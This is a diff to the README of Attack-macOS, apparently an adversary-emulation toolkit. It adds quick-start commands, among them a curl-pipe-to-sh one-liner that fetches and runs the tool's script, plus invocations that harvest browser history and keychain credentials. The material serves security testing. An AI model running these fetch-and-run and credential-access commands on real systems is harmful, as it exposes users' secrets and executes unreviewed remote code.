@@ -187,22 +187,46 @@ All Attack-macOS scripts use native macOS binaries, interpreters, playlists, lib
 
 ### Quick Start
 
-**Install Options:**
+**Download attackmacos.sh:**
+
+```
+curl -O https://raw.githubusercontent.com/armadoinc/attack-macos/main/attackmacos/attackmacos.sh
+chmod +x attackmacos.sh
+```
+
+**Execute techniques remotely (no local repository needed):**
+
+```
+# Execute a discovery technique
+./attackmacos.sh --method curl --tactic discovery --ttp browser_history
+
+# List available techniques for a tactic  
+./attackmacos.sh --list --tactic discovery
+
+# Execute with arguments
+./attackmacos.sh --method curl --tactic credential_access --ttp keychain --args '--verbose'
+
+# Show help and available options
+./attackmacos.sh --help
+```
+
+**Alternative: One-liner execution (no download needed):**
+
+```
+curl -sSL https://raw.githubusercontent.com/armadoinc/attack-macos/main/attackmacos/attackmacos.sh | sh -s -- --method curl --tactic discovery --ttp browser_history
+```
+
+**For development/customization (full repository):**
 
 ```
 git clone https://github.com/armadoinc/attack-macos
-```
+cd attack-macos/attackmacos
 
-**Fetch and Execute:**
+# Execute locally installed scripts
+./attackmacos.sh --method local --tactic discovery --ttp browser_history
 
-```
-TBD
-```
-
-**Remote Execution:**
-
-```
-TBD
+# Scripts can also run standalone
+./ttp/discovery/browser_history/browser_history.sh
 ```
 
 ##
